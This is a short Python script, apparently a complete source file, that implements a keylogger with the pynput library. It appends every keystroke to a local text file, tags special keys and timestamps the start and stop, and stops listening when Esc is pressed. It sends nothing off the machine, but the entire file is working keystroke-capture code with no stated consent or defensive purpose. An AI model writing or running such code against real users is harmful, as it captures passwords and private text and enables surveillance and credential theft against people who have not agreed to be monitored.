from pynput import keyboard
import time

# File to save keystrokes
log_file = "keystrokes.txt"

# Open the file in append mode and write a start message
with open(log_file, "a") as f:
    f.write(f"Keylogger started at {time.ctime()}\n")

# Function to handle each key press
def on_press(key):
    try:
        # Convert key to string (e.g., 'a', '1', etc.)
        key_str = key.char
    except AttributeError:
        # Handle special keys (e.g., space, enter)
        key_str = str(key)

    # Write the key to the file
    with open(log_file, "a") as f:
        if key_str == "Key.space":
            f.write(" ")  # Write a space
        elif key_str == "Key.enter":
            f.write("\n")  # New line for Enter
        elif key_str == "Key.backspace":
            f.write("[BACKSPACE]")  # Note backspace
        elif key_str.startswith("Key."):
            f.write(f"[{key_str.upper()}]")  # Other special keys
        else:
            f.write(key_str)

# Function to handle key release (optional stopping mechanism)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the keylogger when Esc is pressed
        with open(log_file, "a") as f:
            f.write(f"\nKeylogger stopped at {time.ctime()}\n")
        return False  # Stop listener

# Start the keylogger
print("Starting keylogger... Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
